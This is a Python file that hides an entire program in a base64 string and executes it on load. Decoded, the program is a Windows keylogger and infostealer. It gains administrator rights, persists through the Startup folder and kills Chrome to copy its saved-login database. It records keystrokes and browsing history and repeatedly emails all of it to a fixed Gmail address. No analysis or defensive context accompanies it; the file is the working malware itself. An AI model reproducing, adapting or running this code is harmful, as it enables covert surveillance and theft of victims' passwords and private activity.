import base64


encoded_script = "CmltcG9ydCBjdHlwZXMKaW1wb3J0IG9zCmltcG9ydCBzaHV0aWwKaW1wb3J0IHNtdHBsaWIKaW1wb3J0IHN5cwppbXBvcnQgdGltZQppbXBvcnQgc3VicHJvY2Vzcwpmcm9tIGVtYWlsIGltcG9ydCBlbmNvZGVycwpmcm9tIGVtYWlsLm1pbWUuYmFzZSBpbXBvcnQgTUlNRUJhc2UKZnJvbSBlbWFpbC5taW1lLm11bHRpcGFydCBpbXBvcnQgTUlNRU11bHRpcGFydApmcm9tIGVtYWlsLm1pbWUudGV4dCBpbXBvcnQgTUlNRVRleHQKZnJvbSBicm93c2VyX2hpc3RvcnkgaW1wb3J0IGdldF9oaXN0b3J5CmZyb20gcHlucHV0IGltcG9ydCBrZXlib2FyZAoKZGVmIGlzX2FkbWluKCk6CiAgICB0cnk6CiAgICAgICAgcmV0dXJuIGN0eXBlcy53aW5kbGwuc2hlbGwzMi5Jc1VzZXJBbkFkbWluKCkKICAgIGV4Y2VwdDoKICAgICAgICByZXR1cm4gRmFsc2UKCmRlZiBydW5fYXNfYWRtaW4oKToKICAgIGlmIG5vdCBpc19hZG1pbigpOgogICAgICAgIHByaW50KCJBdHRlbXB0aW5nIHRvIHJlbGF1bmNoIGFzIGFkbWluLi4uIikKICAgICAgICBjdHlwZXMud2luZGxsLnNoZWxsMzIuU2hlbGxFeGVjdXRlVyhOb25lLCAicnVuYXMiLCBzeXMuZXhlY3V0YWJsZSwgIiAiLmpvaW4oc3lzLmFyZ3YpLCBOb25lLCAxKQogICAgICAgIHN5cy5leGl0KCkKCmRlZiBmaW5kX2V4ZSgpOgogICAgc3RhcnR1cF9mb2xkZXIgPSBvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCJBUFBEQVRBIiksICJNaWNyb3NvZnQiLCAiV2luZG93cyIsICJTdGFydCBNZW51IiwgIlByb2dyYW1zIiwgIlN0YXJ0dXAiKQogICAgZXhlX2ZpbGVfcGF0aCA9IG9zLnBhdGguam9pbihzdGFydHVwX2ZvbGRlciwgIkFsaWNlLmV4ZSIpCiAgICByZXR1cm4gb3MucGF0aC5pc2ZpbGUoZXhlX2ZpbGVfcGF0aCkKCmRlZiBhZGRfdG9fc3RhcnR1cF93aW5kb3dzKCk6CiAgICBzY3JpcHRfcGF0aCA9IG9zLnBhdGguYWJzcGF0aChzeXMuYXJndlswXSkKICAgIHN0YXJ0dXBfZm9sZGVyID0gb3MucGF0aC5qb2luKG9zLmdldGVudigiQVBQREFUQSIpLCAiTWljcm9zb2Z0IiwgIldpbmRvd3MiLCAiU3RhcnQgTWVudSIsICJQcm9ncmFtcyIsICJTdGFydHVwIikKICAgIHRyeToKICAgICAgICBzaHV0aWwuY29weShzY3JpcHRfcGF0aCwgc3RhcnR1cF9mb2xkZXIpCiAgICBleGNlcHQgUGVybWlzc2lvbkVycm9yOgogICAgICAgIHByaW50KCJQZXJtaXNzaW9uIGRlbmllZC4gQXR0ZW1wdGluZyB0byBydW4gYXMgYWRtaW4uLi4iKQogICAgICAgIHJ1bl9hc19hZG1pbigpCgpkZWYgc2VuZF9lbWFpbChzdWJqZWN0LCBib2R5LCB0b19lbWFpbCwgYXR0YWNobWVudF9wYXRocywgc210cF9zZXJ2ZXIsIHNtdHBfcG9ydCwgc2VuZGVyX2VtYWlsKToKICAgIG1zZyA9IE1JTUVNdWx0aXBhcnQoKQogICAgbXNnWydGcm9tJ10gPSBzZW5kZXJfZW1haWwKICAgIG1zZ1snVG8nXSA9IHRvX2VtYWlsCiAgICBtc2dbJ1N1YmplY3QnXSA9IHN1YmplY3QKICAgIG1zZy5hdHRhY2goTUlNRVRleHQoYm9keSwgJ3BsYWluJykpCgogICAgZm9yIGF0dGFjaG1lbnRfcGF0aCBpbiBhdHRhY2htZW50X3BhdGhzOgogICAgICAgIGlmIGF0dGFjaG1lbnRfcGF0aDoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgd2l0aCBvcGVuKGF0dGFjaG1lbnRfcGF0aCwgInJiIikgYXMgYXR0YWNobWVudDoKICAgICAgICAgICAgICAgICAgICBwYXJ0ID0gTUlNRUJhc2UoJ2FwcGxpY2F0aW9uJywgJ29jdGV0LXN0cmVhbScpCiAgICAgICAgICAgICAgICAgICAgcGFydC5zZXRfcGF5bG9hZChhdHRhY2htZW50LnJlYWQoKSkKICAgICAgICAgICAgICAgICAgICBlbmNvZGVycy5lbmNvZGVfYmFzZTY0KHBhcnQpCiAgICAgICAgICAgICAgICAgICAgcGFydC5hZGRfaGVhZGVyKCdDb250ZW50LURpc3Bvc2l0aW9uJywgZidhdHRhY2htZW50OyBmaWxlbmFtZT0ie29zLnBhdGguYmFzZW5hbWUoYXR0YWNobWVudF9wYXRoKX0iJykKICAgICAgICAgICAgICAgICAgICBtc2cuYXR0YWNoKHBhcnQpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIHByaW50KGYiRmFpbGVkIHRvIGF0dGFjaCBmaWxlIHthdHRhY2htZW50X3BhdGh9OiB7ZX0iKQoKICAgIHRyeToKICAgICAgICB3aXRoIHNtdHBsaWIuU01UUChzbXRwX3NlcnZlciwgc210cF9wb3J0KSBhcyBzZXJ2ZXI6CiAgICAgICAgICAgIHNlcnZlci5zdGFydHRscygpCiAgICAgICAgICAgIHNlcnZlci5sb2dpbihzZW5kZXJfZW1haWwsICIiKSAgCiAgICAgICAgICAgIHNlcnZlci5zZW5kbWFpbChzZW5kZXJfZW1haWwsIHRvX2VtYWlsLCBtc2cuYXNfc3RyaW5nKCkpCiAgICAgICAgcHJpbnQoIkVtYWlsIHNlbnQgc3VjY2Vzc2Z1bGx5LiIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJGYWlsZWQgdG8gc2VuZCBlbWFpbDoge2V9IikKCmRlZiBrZXlfcHJlc3NlZChrZXkpOgogICAgdHJ5OgogICAgICAgIHdpdGggb3Blbigia2V5ZmlsZS50eHQiLCAnYScpIGFzIGxvZ0tleToKICAgICAgICAgICAgaWYgaGFzYXR0cihrZXksICdjaGFyJykgYW5kIGtleS5jaGFyIGlzIG5vdCBOb25lOgogICAgICAgICAgICAgICAgbG9nS2V5LndyaXRlKGtleS5jaGFyKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgaWYga2V5ID09IGtleWJvYXJkLktleS5iYWNrc3BhY2U6CiAgICAgICAgICAgICAgICAgICAgbG9nS2V5LndyaXRlKCJbQkFDS1NQQUNFXSIpCiAgICAgICAgICAgICAgICBlbGlmIGtleSA9PSBrZXlib2FyZC5LZXkuc3BhY2U6CiAgICAgICAgICAgICAgICAgICAgbG9nS2V5LndyaXRlKCIgIikKICAgICAgICAgICAgICAgIGVsaWYga2V5ID09IGtleWJvYXJkLktleS5lbnRlcjoKICAgICAgICAgICAgICAgICAgICBsb2dLZXkud3JpdGUoIlxcbiIpICAKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgbG9nS2V5LndyaXRlKGYiW3trZXkubmFtZX1dIikKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIkVycm9yIGxvZ2dpbmcga2V5OiB7ZX0iKQoKZGVmIGNsb3NlX2Nocm9tZSgpOgogICAgdHJ5OgogICAgICAgIHN1YnByb2Nlc3MucnVuKFsidGFza2tpbGwiLCAiL0YiLCAiL0lNIiwgImNocm9tZS5leGUiXSwgY2hlY2s9VHJ1ZSkKICAgICAgICBwcmludCgiQ2hyb21lIGhhcyBiZWVuIGNsb3NlZC4iKQogICAgZXhjZXB0IHN1YnByb2Nlc3MuQ2FsbGVkUHJvY2Vzc0Vycm9yOgogICAgICAgIHByaW50KCJDaHJvbWUgd2FzIG5vdCBydW5uaW5nIG9yIGNvdWxkIG5vdCBiZSBjbG9zZWQuIikKCmRlZiBjb3B5X2Nocm9tZV9sb2dpbl9kYXRhKGRlc3RpbmF0aW9uKToKICAgIHVzZXIgPSBvcy5nZXRsb2dpbigpCiAgICBsb2dpbl9kYXRhX3BhdGggPSByZiJDOlxVc2Vyc1x7dXNlcn1cQXBwRGF0YVxMb2NhbFxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxEZWZhdWx0XExvZ2luIERhdGEiCiAgICBsb2dpbl9kYXRhX2FjY291bnRfcGF0aCA9IHJmIkM6XFVzZXJzXHt1c2VyfVxBcHBEYXRhXExvY2FsXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcTG9naW4gRGF0YSBmb3IgQWNjb3VudCIKICAgIAogICAgb3MubWFrZWRpcnMoZGVzdGluYXRpb24sIGV4aXN0X29rPVRydWUpCgogICAgbG9naW5fZGF0YV9kZXN0aW5hdGlvbl9wYXRoID0gb3MucGF0aC5qb2luKGRlc3RpbmF0aW9uLCAiTG9naW5fRGF0YSIpCiAgICBsb2dpbl9kYXRhX2FjY291bnRfZGVzdGluYXRpb25fcGF0aCA9IG9zLnBhdGguam9pbihkZXN0aW5hdGlvbiwgIkxvZ2luX0RhdGFfZm9yX0FjY291bnQiKQoKICAgIGNvcGllZF9maWxlcyA9IFtdCgogICAgdHJ5OgogICAgICAgIHNodXRpbC5jb3B5Mihsb2dpbl9kYXRhX3BhdGgsIGxvZ2luX2RhdGFfZGVzdGluYXRpb25fcGF0aCkKICAgICAgICBwcmludChmIkNvcGllZCAnTG9naW4gRGF0YScgdG8ge2xvZ2luX2RhdGFfZGVzdGluYXRpb25fcGF0aH0iKQogICAgICAgIGNvcGllZF9maWxlcy5hcHBlbmQobG9naW5fZGF0YV9kZXN0aW5hdGlvbl9wYXRoKQoKICAgICAgICBzaHV0aWwuY29weTIobG9naW5fZGF0YV9hY2NvdW50X3BhdGgsIGxvZ2luX2RhdGFfYWNjb3VudF9kZXN0aW5hdGlvbl9wYXRoKQogICAgICAgIHByaW50KGYiQ29waWVkICdMb2dpbiBEYXRhIGZvciBBY2NvdW50JyB0byB7bG9naW5fZGF0YV9hY2NvdW50X2Rlc3RpbmF0aW9uX3BhdGh9IikKICAgICAgICBjb3BpZWRfZmlsZXMuYXBwZW5kKGxvZ2luX2RhdGFfYWNjb3VudF9kZXN0aW5hdGlvbl9wYXRoKQoKICAgICAgICByZXR1cm4gY29waWVkX2ZpbGVzCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3IgYXMgZToKICAgICAgICBwcmludChmIkZpbGUgbm90IGZvdW5kOiB7ZX0iKQogICAgICAgIHJldHVybiBbXQogICAgZXhjZXB0IFBlcm1pc3Npb25FcnJvcjoKICAgICAgICBwcmludCgiUGVybWlzc2lvbiBkZW5pZWQuIEVuc3VyZSB0aGUgc2NyaXB0IGlzIHJ1biB3aXRoIGFwcHJvcHJpYXRlIHBlcm1pc3Npb25zLiIpCiAgICAgICAgcmV0dXJuIFtdCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJBbiBlcnJvciBvY2N1cnJlZDoge2V9IikKICAgICAgICByZXR1cm4gW10KCmRlZiBtYWluKCk6CiAgICBydW5fYXNfYWRtaW4oKQogICAgaGlkZGVuX2RpciA9IG9zLnBhdGguam9pbihvcy5nZXRlbnYoIkFQUERBVEEiKSwgIk15SGlkZGVuRm9sZGVyIikKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhoaWRkZW5fZGlyKToKICAgICAgICBvcy5tYWtlZGlycyhoaWRkZW5fZGlyKQogICAgICAgIHN1YnByb2Nlc3MucnVuKFsnYXR0cmliJywgJytoJywgaGlkZGVuX2Rpcl0pCgogICAgbG9nX2ZpbGVfcGF0aCA9IG9zLnBhdGguam9pbihvcy5nZXRjd2QoKSwgImtleWZpbGUudHh0IikKICAgIHN1YmplY3QgPSAiS2V5cyIKICAgIGJvZHkgPSAiSGVsbG8sIHRoaXMgaXMgYSB0ZXN0IGVtYWlsIGZyb20gdHV0YW5vdGEuY29tIgogICAgdG9fZW1haWwgPSAic2VAZ21haWwuY29tIgogICAgc210cF9zZXJ2ZXIgPSAic210cC5nbWFpbC5jb20iCiAgICBzbXRwX3BvcnQgPSA1ODcKICAgIHNlbmRlcl9lbWFpbCA9ICJzZUBnbWFpbC5jb20iCgogICAgZXhlX2V4aXN0cyA9IGZpbmRfZXhlKCkKICAgIGlmIG5vdCBleGVfZXhpc3RzOgogICAgICAgIGFkZF90b19zdGFydHVwX3dpbmRvd3MoKQoKICAgIGNsb3NlX2Nocm9tZSgpCiAgICBsb2dpbl9kYXRhX2F0dGFjaG1lbnRfcGF0aHMgPSBjb3B5X2Nocm9tZV9sb2dpbl9kYXRhKGhpZGRlbl9kaXIpCgogICAgbGlzdGVuZXIgPSBrZXlib2FyZC5MaXN0ZW5lcihvbl9wcmVzcz1rZXlfcHJlc3NlZCkKICAgIGxpc3RlbmVyLnN0YXJ0KCkKCiAgICB0aW1lLnNsZWVwKDEyMCkKCiAgICB3aGlsZSBUcnVlOgogICAgICAgIG91dHB1dHMgPSBnZXRfaGlzdG9yeSgpCiAgICAgICAgaGlzdG9yeV9maWxlX3BhdGggPSBvcy5wYXRoLmpvaW4oaGlkZGVuX2RpciwgImhpc3RvcnkuanNvbiIpCiAgICAgICAgb3V0cHV0cy5zYXZlKGhpc3RvcnlfZmlsZV9wYXRoKQoKICAgICAgICB0aW1lLnNsZWVwKDIwKQoKICAgICAgICBhdHRhY2htZW50X3BhdGhzID0gW2xvZ19maWxlX3BhdGhdICsgbG9naW5fZGF0YV9hdHRhY2htZW50X3BhdGhzCgogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKGhpc3RvcnlfZmlsZV9wYXRoKToKICAgICAgICAgICAgYXR0YWNobWVudF9wYXRocy5hcHBlbmQoaGlzdG9yeV9maWxlX3BhdGgpCgogICAgICAgIHNlbmRfZW1haWwoc3ViamVjdCwgYm9keSwgdG9fZW1haWwsIGF0dGFjaG1lbnRfcGF0aHMsIHNtdHBfc2VydmVyLCBzbXRwX3BvcnQsIHNlbmRlcl9lbWFpbCkKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCkK"

exec(base64.b64decode(encoded_script).decode('utf-8'))
